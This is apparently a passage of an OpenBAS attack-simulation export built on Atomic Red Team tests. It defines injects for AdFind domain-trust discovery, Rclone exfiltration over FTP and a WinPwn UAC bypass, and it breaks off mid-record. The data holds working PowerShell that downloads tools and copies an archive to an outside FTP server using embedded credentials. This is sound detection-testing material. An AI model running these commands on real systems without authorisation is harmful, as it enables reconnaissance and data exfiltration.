          "get_command" : "New-Item -Type Directory (split-path \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\"\n",
          "check_command" : "if (Test-Path \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\") {exit 0} else {exit 1}\n",
          "description" : "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n"
        }, {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory (split-path \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/../ExternalPayloads/AdFind.exe\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\"",
          "check_command" : "if (Test-Path '#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}') {exit 0} else {exit 1}",
          "description" : ""
        } ],
        "payload_external_id" : "15fe436d-e771-4ff3-b655-2dca9ba52834",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:45.218017Z",
        "payload_updated_at" : "2025-07-03T14:50:41.987826Z",
        "command_executor" : "cmd",
        "command_content" : "\"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\" #{optional_args} -gcb -sc trustdmp\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:45.231333Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:45.231334Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "f72b5ad5-2c64-4788-9ca3-fe33bd84465a",
        "attack_pattern_name" : "Domain Trust Discovery",
        "attack_pattern_description" : "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
        "attack_pattern_external_id" : "T1482",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
          "phase_external_id" : "TA0007",
          "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
          "phase_name" : "Discovery",
          "phase_shortname" : "discovery",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
          "phase_order" : 8
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "44b2d222-19ff-4361-8273-c084d3da2b2a",
    "inject_title" : "Exfiltration Over Alternative Protocol - FTP - Rclone",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "ftp_server" : "ftp.dlptest.com",
      "ftp_pass" : "rNrKYTX9g7z3RgJRmxWuGHbeu",
      "ftp_user" : "dlpuser",
      "ftp_port" : "21",
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1620,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Exfiltration Over Alternative Protocol - FTP - Rclone",
          "fr" : "Exfiltration Over Alternative Protocol - FTP - Rclone"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "ftp_server",
          "label" : "ftp_server",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "ftp.dlptest.com",
          "type" : "text"
        }, {
          "key" : "ftp_pass",
          "label" : "ftp_pass",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "rNrKYTX9g7z3RgJRmxWuGHbeu",
          "type" : "text"
        }, {
          "key" : "ftp_user",
          "label" : "ftp_user",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "dlpuser",
          "type" : "text"
        }, {
          "key" : "ftp_port",
          "label" : "ftp_port",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "21",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "817f8310-d9d9-4a01-be5e-8caf4f65caa9",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "817f8310-d9d9-4a01-be5e-8caf4f65caa9",
      "injector_contract_labels" : {
        "en" : "Exfiltration Over Alternative Protocol - FTP - Rclone",
        "fr" : "Exfiltration Over Alternative Protocol - FTP - Rclone"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Exfiltration Over Alternative Protocol - FTP - Rclone\",\"fr\":\"Exfiltration Over Alternative Protocol - FTP - Rclone\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"ftp_server\",\"label\":\"ftp_server\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"ftp.dlptest.com\",\"type\":\"text\"},{\"key\":\"ftp_pass\",\"label\":\"ftp_pass\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"rNrKYTX9g7z3RgJRmxWuGHbeu\",\"type\":\"text\"},{\"key\":\"ftp_user\",\"label\":\"ftp_user\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"dlpuser\",\"type\":\"text\"},{\"key\":\"ftp_port\",\"label\":\"ftp_port\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"21\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"817f8310-d9d9-4a01-be5e-8caf4f65caa9\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "c1b5d214-635c-404f-8108-0b847927f926",
        "payload_type" : "Command",
        "payload_name" : "Exfiltration Over Alternative Protocol - FTP - Rclone",
        "payload_description" : "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "cb8b26ef-69c4-40d7-9bcd-f944bc832911",
          "attack_pattern_name" : "Exfiltration Over Unencrypted Non-C2 Protocol",
          "attack_pattern_description" : "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
          "attack_pattern_external_id" : "T1048.003",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "06717ecb-fc13-423f-a680-59ae1ef4967d",
            "phase_external_id" : "TA0010",
            "phase_stix_id" : "x-mitre-tactic--9a4e74ab-5008-408c-84bf-a10dfbc53462",
            "phase_name" : "Exfiltration",
            "phase_shortname" : "exfiltration",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
            "phase_order" : 12
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : true,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "ftp_server",
          "default_value" : "ftp.dlptest.com",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "ftp_pass",
          "default_value" : "rNrKYTX9g7z3RgJRmxWuGHbeu",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "ftp_user",
          "default_value" : "dlpuser",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "ftp_port",
          "default_value" : "21",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n",
          "check_command" : "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
          "description" : "Check if the exfil package exists\n"
        }, {
          "executor" : "psh",
          "get_command" : "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n",
          "check_command" : "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
          "description" : "Check if rclone zip exists"
        } ],
        "payload_external_id" : "b854eb97-bf9b-45ab-a1b5-b94e4880c56b",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:55.190748Z",
        "payload_updated_at" : "2025-07-03T14:51:32.421689Z",
        "command_executor" : "psh",
        "command_content" : "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:55.203423Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:55.203424Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "cb8b26ef-69c4-40d7-9bcd-f944bc832911",
        "attack_pattern_name" : "Exfiltration Over Unencrypted Non-C2 Protocol",
        "attack_pattern_description" : "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
        "attack_pattern_external_id" : "T1048.003",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "06717ecb-fc13-423f-a680-59ae1ef4967d",
          "phase_external_id" : "TA0010",
          "phase_stix_id" : "x-mitre-tactic--9a4e74ab-5008-408c-84bf-a10dfbc53462",
          "phase_name" : "Exfiltration",
          "phase_shortname" : "exfiltration",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
          "phase_order" : 12
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "84c46ac8-db47-4117-bdc7-90c980b309b8",
    "inject_title" : "WinPwn - UAC Bypass ccmstp technique",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 900,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "WinPwn - UAC Bypass ccmstp technique",
          "fr" : "WinPwn - UAC Bypass ccmstp technique"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "4652d527-ffc4-4cf2-99bf-11bc2f8b9e72",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "4652d527-ffc4-4cf2-99bf-11bc2f8b9e72",
      "injector_contract_labels" : {
        "en" : "WinPwn - UAC Bypass ccmstp technique",
        "fr" : "WinPwn - UAC Bypass ccmstp technique"
      },
      "injector_contract_manual" : false,
